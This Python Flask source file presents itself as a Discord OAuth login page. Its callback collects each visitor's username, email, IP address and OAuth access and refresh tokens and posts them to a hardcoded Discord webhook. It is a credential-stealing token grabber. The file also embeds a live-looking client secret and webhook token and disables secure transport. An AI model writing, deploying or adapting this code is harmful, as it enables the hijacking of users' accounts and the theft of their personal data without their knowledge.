from requests_oauthlib import OAuth2Session
from flask import Flask, request, redirect, session
import os
import requests

os.environ['OAUTHLIB_INSECURE_TRANSPORT'] = '1'

base_discord_api_url = 'https://discordapp.com/api'
client_id = '1178048620939972798'
client_secret = "84mKESgz8NKl-wvDb8i5UGP-_b3WqQgs"
redirect_uri = 'https://flask-production-6a75.up.railway.app/oauth_callback'
scope = ['identify', 'email', 'connections']
token_url = 'https://discordapp.com/api/oauth2/token'
authorize_url = 'https://discordapp.com/api/oauth2/authorize'

app = Flask(__name__)
app.secret_key = os.urandom(24)

def create_embed(user_id, user_ip, profile_data, access_token, refresh_token, color="#00FF00"):
    embed = {
        'title': 'Discord OAuth Data',
        'color': int(color.lstrip("#"), 16), 
        'fields': [
            {'name': 'User ID', 'value': str(user_id), 'inline': True},
            {'name': 'Username', 'value': profile_data['username'], 'inline': True},
            {'name': 'Email', 'value': profile_data['email'], 'inline': True},
            {'name': 'Access Token', 'value': access_token, 'inline': True},
            {'name': 'Refresh Token', 'value': refresh_token, 'inline': True},
            {'name': 'User IP', 'value': user_ip, 'inline': True}
        ]
    }
    return embed

@app.route("/")
def home():
    # Generate a random state and store it in the session
    state = os.urandom(24)
    session['state'] = state

    oauth = OAuth2Session(client_id, redirect_uri="https://flask-production-6a75.up.railway.app/oauth_callback", scope=scope, state=state)
    login_url, _ = oauth.authorization_url(authorize_url)

    return f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Discord OAuth Login</title>
<style>
@import url("https://fonts.googleapis.com/css?family=Inter:100,200,300,400,500,600,700,800,900&display=swap");
body {
    color: #fff;
    font-family: Inter;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.5;
}
* {
    box-sizing: inherit;
}

body {
    margin: 0;
    color: #fff;
    font-family: Inter;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.5;
    background-color: #121212;
}

body {
    scrollbar-color: hsla(0, 0%, 100%, 0.25) transparent;
    background-color: transparent !important;
}

html {
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    box-sizing: border-box;
    -webkit-text-size-adjust: 100%;
}

html {
    background-color: #09090d !important;
    height: 100% !important;
}

:root {
    color-scheme: dark;
}

.mui-style-qceu3r {
    background-color: #00000026;
    color: #fff;
    flex-direction: column;
    position: absolute;
    left: 25%;
    top: 15%;
    right: 30%;
    -webkit-transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    transition: box-shadow 300ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    border-radius: 1rem;
    box-shadow: 0px 2px 1px -1px rgba(0, 0, 0, 0.2),
        0px 1px 1px 0px rgba(0, 0, 0, 0.14), 0px 1px 3px 0px rgba(0, 0, 0, 0.12);
    background-image: linear-gradient(
        rgba(255, 255, 255, 0.05),
        rgba(255, 255, 255, 0.05)
    );
    padding: 2rem;
    margin-top: 1rem;
    text-align: center;
    margin-bottom: 2rem;
    box-shadow: 0px 10px 10px 5px rgba(0, 0, 0, 0.25);
    -webkit-backdrop-filter: blur(1.5rem);
    backdrop-filter: blur(1.5rem);
}

@media (min-width: 0px) {
    .mui-style-qceu3r {
        width: 100%;
    }
}

@media (min-width: 900px) {
    .mui-style-qceu3r {
        width: 50%;
    }
}

*,
:before,
:after {
    box-sizing: inherit;
}

.mui-style-1n2mv2k {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
}

.mui-style-iqirns {
    margin: 0;
    font-family: Inter;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.5;
    text-align: center;
    white-space: pre-line;
    overflow-wrap: break-word;
}

@media (min-width: 0px) {
    .mui-style-iqirns {
        font-size: 1rem;
    }
}

@media (min-width: 900px) {
    .mui-style-iqirns {
        font-size: 1.75rem;
    }
}

.mui-style-1p07y8n {
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    margin-top: 1rem;
}

.mui-style-ewqgob {
    margin: 0;
    font-family: Inter;
    font-weight: 700;
    font-size: 6rem;
    line-height: 1.167;
    padding-left: 1rem;
    margin-right: 1rem;
    text-shadow: 0px 0px 15px rgba(0, 0, 0, 0.25);
    text-align: center;
}

@media (min-width: 0px) {
    .mui-style-ewqgob {
        font-size: 1.5rem;
    }
}

@media (min-width: 900px) {
    .mui-style-ewqgob {
        font-size: 3rem;
    }
}

.mui-style-jxmg75 {
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    width: 2rem;
    height: 2rem;
    display: inline-block;
    fill: currentColor;
    -webkit-flex-shrink: 0;
    -ms-flex-negative: 0;
    flex-shrink: 0;
    -webkit-transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    font-size: 1.5rem;
    color: #9e9e9e;
}

.mui-style-1lpgmjw {
    position: relative;
    display: -webkit-box;
    display: -webkit-flex;
    display: -ms-flexbox;
    display: flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    -webkit-flex-shrink: 0;
    -ms-flex-negative: 0;
    flex-shrink: 0;
    width: 40px;
    height: 40px;
    font-family: Inter;
    font-size: 1.25rem;
    line-height: 1;
    border-radius: 50%;
    overflow: hidden;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
}

@media (min-width: 0px) {
    .mui-style-1lpgmjw {
        width: 6rem;
        height: 6rem;
    }
}

@media (min-width: 900px) {
    .mui-style-1lpgmjw {
        width: 8rem;
        height: 8rem;
    }
}

.mui-style-dnfvx4 {
    display: -webkit-inline-box;
    display: -webkit-inline-flex;
    display: -ms-inline-flexbox;
    display: inline-flex;
    -webkit-align-items: center;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    -webkit-box-pack: center;
    -ms-flex-pack: center;
    -webkit-justify-content: center;
    justify-content: center;
    position: relative;
    box-sizing: border-box;
    -webkit-tap-highlight-color: transparent;
    background-color: #4e46ef;
    outline: 1px solid #4e46ef;
    border: 0;
    margin: 0;
    border-radius: 14px;
    padding: 8px 14px;
    cursor: pointer;
    -webkit-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    vertical-align: middle;
    -moz-appearance: none;
    -webkit-appearance: none;
    -webkit-text-decoration: none;
    text-decoration: none;
    color: #fff;
    font-family: Inter;
    font-weight: 500;
    font-size: 0.875rem;
    line-height: 1.75;
    text-transform: uppercase;
    min-width: 64px;
    -webkit-transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms,
        color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
    box-shadow: 0px 3px 1px -2px rgba(0, 0, 0, 0.2),
        0px 2px 2px 0px rgba(0, 0, 0, 0.14), 0px 1px 5px 0px rgba(0, 0, 0, 0.12);
    transition-duration: 0.3s;
    width: 100%;
    margin-top: 2rem;
}

.mui-style-dnfvx4:hover {
    -webkit-text-decoration: none;
    text-decoration: none;
    background-color: rgb(55, 49, 160);
    box-shadow: 0px 2px 4px -1px rgba(0, 0, 0, 0.2),
        0px 4px 5px 0px rgba(0, 0, 0, 0.14),
        0px 1px 10px 0px rgba(0, 0, 0, 0.12);
}

@media not all and (-webkit-min-device-pixel-ratio: 1.5),
    not all and (-o-min-device-pixel-ratio: 3/2),
    not all and (min--moz-device-pixel-ratio: 1.5),
    not all and (min-device-pixel-ratio: 1.5) {
    .mui-style-dnfvx4:hover {
        background-color: transparent;
        color: #4f46e5;
    }

    .mui-style-dnfvx4:hover {
        outline: 1px solid #4e46ef;
        color: #4e46ef;
    }
}

.mui-style-1hy9t21 {
    width: 100%;
    height: 100%;
    text-align: center;
    object-fit: cover;
    color: transparent;
    text-indent: 10000px;
}

.mui-style-w0pj6f {
    overflow: hidden;
    pointer-events: none;
    position: absolute;
    z-index: 0;
    inset: 0px;
    border-radius: inherit;
}


</style>
    </head>
    <body>
        <h1>Discord OAuth Login</h1>
        <p>Click the button below to log in with Discord:</p>
        <a href="{login_url}"><button>Login with Discord</button></a>
    </body>
    </html>
    '''

@app.route("/oauth_callback")
def oauth_callback():
    try:
        # Check if 'state' is present in the query parameters
        if 'state' not in request.args:
            return 'Invalid callback. Missing state parameter.'

        # Verify that the state in the query parameters matches the one stored in the session
        if request.args['state'] != session.get('state'):
            return 'Invalid callback. State mismatch.'

        discord = OAuth2Session(client_id, redirect_uri=redirect_uri, state=session['state'], scope=scope)
        token = discord.fetch_token(
            token_url,
            client_secret=client_secret,
            authorization_response=request.url,
        )

        # Store the token in the session
        session['discord_token'] = token

        response = discord.get(base_discord_api_url + '/users/@me')
        user_id = response.json()['id']

        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

        webhook_url = 'https://discord.com/api/webhooks/1182750185584066711/dn1wISc0tPKn4SIgiwvbZQVnKlOxsLGrIaKpy8QAOaYO5qNmIFu54IpVopxlm8-P7yzJ'

        profile_data = response.json()
        embed = create_embed(user_id, user_ip, profile_data, session["discord_token"]["access_token"], session["discord_token"]["refresh_token"], color="#00FF00")

        data = {'embeds': [embed]}
        response = requests.post(webhook_url, json=data)

        if response.status_code == 200:
            print("Webhook request successful")
        else:
            print(f"Webhook request failed with status code {response.status_code}")
            print(response.text)

        return 'Authentication successful. Your data has been sent to the webhook.'

    except Exception as e:
        # Print the detailed error message
        print(f"An error occurred: {e}")
        return f'An error occurred during authentication. Details: {e}'

@app.route("/profile")
def profile():
    if 'discord_token' not in session:
        return 'You are not logged in. Please <a href="/">login with Discord</a> first.'
    discord = OAuth2Session(client_id, token=session['discord_token'])
    response = discord.get(base_discord_api_url + '/users/@me')
    user_id = response.json()['id']
    return f'Profile: {user_id}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
